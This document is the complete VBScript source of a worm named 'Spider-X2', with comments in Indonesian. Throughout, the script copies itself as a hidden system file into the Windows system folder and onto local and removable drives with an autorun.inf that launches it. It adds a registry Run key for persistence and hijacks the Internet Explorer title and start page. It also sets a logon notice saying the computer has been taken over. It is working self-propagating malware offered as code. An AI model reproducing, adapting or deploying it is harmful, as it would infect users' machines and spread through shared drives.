‘Spider-X2
‘Varian dari Spider.VBS
on error resume next

‘Dim kata-kata berikut
dim rekur,syspath,windowpath,desades,longka,mf,isi,tf,spider,nt,check,sd

’siapkan isi autorun
isi = “[autorun]” & vbcrlf & “shellexecute=wscript.exe 5p1d3r.sys.vbs”
set longka = createobject(”Scripting.FileSystemObject”)
set mf = longka.getfile(Wscript.ScriptFullname)
dim text,size
size = mf.size
check = mf.drive.drivetype
set text = mf.openastextstream(1,-2)
do while not text.atendofstream
rekur = rekur & text.readline
rekur = rekur & vbcrlf
loop
do

‘buat file induk
Set windowpath = longka.getspecialfolder(0)
Set syspath = longka.getspecialfolder(1)
set tf = longka.getfile(syspath & “\recycle.vbs”)
tf.attributes = 32
set tf = longka.createtextfile(syspath & “\recycle.vbs”,2,true)
tf.write rekur
tf.close
set tf = longka.getfile(syspath & “\recycle.vbs”)
tf.attributes = 39

’sebar ke removable disc ditambahkan dengan Autorun.inf
for each desades in longka.drives

If (desades.drivetype = 1 or desades.drivetype = 2) and desades.path <> “A:” then

set tf=longka.getfile(desades.path &”\5p1d3r.sys.vbs”)
tf.attributes =32
set tf=longka.createtextfile(desades.path &”\5p1d3r.sys.vbs”,2,true)
tf.write rekur
tf.close
set tf=longka.getfile(desades.path &”\5p1d3r.sys.vbs”)
tf.attributes = 39

set tf =longka.getfile(desades.path &”\autorun.inf”)
tf.attributes = 32
set tf=longka.createtextfile(desades.path &”\autorun.inf”,2,true)
tf.write isi
tf.close
set tf = longka.getfile(desades.path &”\autorun.inf”)
tf.attributes=39
end if
next

‘Manipulasi Registry
set spider = createobject(”WScript.Shell”)

‘Ubah IE Title
spider.regwrite “HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title”,”:: X2 ATTACK ::”

‘Ubah tulisan pertama pada text box menu RUN
spider.RegWrite “HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\a”, “SPIDER-X2/1″
spider.RegWrite “HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\MRUList”, “a”

‘Buat pesan saat Windows Startup
spider.regwrite “HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeCaption”, “SPIDER-X2″
spider.RegWrite “HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeText”, “Komputer Anda Diambil Alih”

‘Aktifkan saat Windows Startup
spider.regwrite “HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Ageia”, syspath & “\recycle.vbs”

‘Ubah Default Start Page Internet Explorer
spider.regwrite “HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page”, “http://www.vaksin.com”

‘Bonus
if check <> 1 then
Wscript.sleep 200000
end if
loop while check <> 1
set sd = createobject(”Wscript.shell”)
sd.run windowpath & “\explorer.exe /e,/select, ” & Wscript.ScriptFullname
